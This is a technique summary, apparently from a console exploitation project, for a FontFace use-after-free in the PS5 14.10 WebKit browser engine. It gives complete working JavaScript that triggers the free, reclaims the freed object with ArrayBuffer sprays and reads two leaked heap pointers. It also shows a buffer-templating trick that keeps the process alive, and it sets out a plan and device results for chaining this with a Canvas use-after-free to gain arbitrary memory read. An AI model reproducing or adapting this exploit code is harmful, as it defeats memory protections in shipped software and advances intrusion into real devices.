# FontFace CSSFontFace Heap Pointer Disclosure — Technique Summary

PS5 14.10, WebKit-1400. Measured 2026-10-29 (p563/p564), combined probe P682 deployed 2026-11-05.

## What This Is

A JavaScript-only heap address disclosure on PS5 14.10. The `FontFaceSet::load()` UAF (CVE-2026-43715) frees a `CSSFontFace` object while the engine still holds a pointer to it. Script reclaims the 192-byte chunk with an `ArrayBuffer`, and the engine's continuation writes two live heap pointers into it.

**This contradicts pastawithpesto's "DoS-only" classification.** They tested the *write* side (m_status overwrite → Timer RELEASE_ASSERT crash) and concluded the 192-byte class has no type confusion target. We tested the *read* side: the engine writes heap pointers into our buffer after the free, and we can read them back.

## The Leaked Values

| offset | value (example) | what it is |
|--------|-----------------|------------|
| +0x00 | `0x01` | RefCounted counter |
| +0x58 | `0x00000010008d8920` | WeakHashSet impl (m_clients internal) |
| +0x68 | `0x00000010007e7060` | WeakPtr impl (m_wrapper internal) |

Both addresses are in the WebProcess heap range (`0x10...`). They move with ASLR across page loads. They are the engine's own allocations, not our buffer's address.

## Trigger (Minimal)

```javascript
var styleEl = document.createElement('style');
styleEl.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
document.head.appendChild(styleEl);

var A = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
document.fonts.add(A);
void A.loaded;

var firedHere = false;
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function(){
    if (firedHere) return undefined;
    firedHere = true;
    styleEl.remove();
    styleEl.textContent = '';
    styleEl = null;
    try { document.fonts.delete(this); } catch(e){}
    document.body.offsetHeight;

    // Spray 192-byte ArrayBuffers to reclaim the freed CSSFontFace
    window.__ffMap = [];
    var SIZES = [64, 96, 128, 160, 192, 224, 256, 320, 384, 512, 768, 1024, 2048];
    for (var si=0; si<SIZES.length; si++){
      for (var k=0; k<8; k++){
        var ab = new ArrayBuffer(SIZES[si]);
        window.__ffMap.push({ size:SIZES[si], view:new Uint8Array(ab), ab:ab });
      }
    }
    try { document.fonts.check('1em s0'); } catch(e){}
    return undefined;
  },
  set: function(){}
});

document.fonts.load('1em f0, s0', 'AB');
```

Then scan 80ms later:
```javascript
setTimeout(function(){
  for (var i=0; i<window.__ffMap.length; i++){
    if (window.__ffMap[i].size !== 192) continue;
    var v = window.__ffMap[i].view, nz=0;
    for (var j=0; j<v.length; j++) if (v[j]!==0) nz++;
    if (nz >= 3){
      var dv = new DataView(window.__ffMap[i].ab);
      var lo58 = dv.getUint32(0x58, true);
      var hi58 = dv.getUint32(0x5C, true);
      var lo68 = dv.getUint32(0x68, true);
      var hi68 = dv.getUint32(0x6C, true);
      // lo58/hi58 and lo68/hi68 are heap addresses
    }
  }
}, 80);
```

## Critical: Buffer Templating (p564 Survival Trick)

After reading the leaked pointers, **template ALL 192-byte buffers** with the engine's own pointers. Otherwise the engine's continued use of the stale CSSFontFace crashes the process.

```javascript
// After reading leaked pointers from hit buffer:
for (var k=0; k<window.__ffMap.length; k++){
  if (window.__ffMap[k].size !== 192) continue;
  var bv = window.__ffMap[k].view;
  bv[0] = 1; bv[1]=0; bv[2]=0; bv[3]=0;  // refcount = 1
  bv[4]=0; bv[5]=0; bv[6]=0; bv[7]=0;
  // Write leaked pointers back at +0x58 and +0x68
  var tmpDv = new DataView(window.__ffMap[k].ab);
  tmpDv.setUint32(0x58, lo58, true);
  tmpDv.setUint32(0x5C, hi58, true);
  tmpDv.setUint32(0x68, lo68, true);
  tmpDv.setUint32(0x6C, hi68, true);
}
```

p564 confirmed: the engine accepts the templated chunk and the page survives (`P564-S2-RESOLVED`, `P564-S2-ALIVE-1`).

## Constraints

- **One success per WebProcess.** After a hit, the process locks up on the next `load()` attempt. Relaunch required.
- **Write arrives ~80ms after the getter, not inside it.** Scanning immediately returns zero.
- **Short family names only.** Long names (>256 chars) crash even on a fresh process.
- **Unstable window.** Same page sometimes hits, sometimes crashes. The outcome depends on heap state we cannot fully control from JS.

## What This Gives You

- **Two heap addresses** in the WebProcess heap range (`0x10...`)
- These are engine-internal allocations (WeakHashSet impl, WeakPtr impl)
- They are NOT the address of our ArrayBuffer
- They move with ASLR, so they defeat heap randomization for objects near these allocations

## What's Still Missing

1. **Self-address.** We know where engine objects are, not where our own memory is. A fake vtable or fake object needs our own address.
2. **Arbitrary read at known address.** P682 combines FontFace leak with Canvas UAF AB(768) reclaim to read memory at the leaked address — testing in progress.
3. **Kernel pointers.** The leaked values are userland WebProcess heap. No kernel addresses involved.

## Combined Probe: P682 (FontFace + Canvas UAF)

`probes/phase23_info_leak/p682_fontface_canvas_arbread.html`

Two-stage probe:
- **Phase A:** FontFace leak → get heap addresses
- **Phase B:** Canvas BMR UAF → free Canvas2D context, reclaim with AB(768), forge `m_stateStack.m_buffer` to point at the leaked address, read through the stale wrapper

If Phase B reads non-default values from lineWidth/miterLimit/globalAlpha/shadowBlur, we have arbitrary read at a known heap address.

## Device Results (2026-11-05, P682v2)

FontFace leak consistently hits at 80ms (buf index 34, 192-byte class). Addresses observed:
- `+0x58 = 0x000000100087c970`, `+0x68 = 0x00000010007eac10`
- `+0x58 = 0x0000001000884970`, `+0x68 = 0x00000010007eabe0`

Buffer templating (p564 trick) works — `A3-TEMPLATE` beacon fires. Process survives to Phase B (Canvas UAF). Phase B reaches B4-FORGE (all ABs forged with leaked address as m_stateStack target). Crash occurs after forge — the read through the forged stale context dereferences the leaked heap address. This confirms the address is valid and mapped but the Canvas2D internal structure at that location doesn't match what lineWidth expects.

## Files

- `docs/FONTFACE_RECLAIM_LEAK_14_10.md` — full measurement writeup
- `probes/phase13_webkit/p563-fontface-reclaim-leak.html` — reclaim + read probe
- `probes/phase13_webkit/p564-fontface-reclaim-template.html` — survival trick probe
- `probes/phase23_info_leak/p682_fontface_canvas_arbread.html` — combined FontFace + Canvas UAF
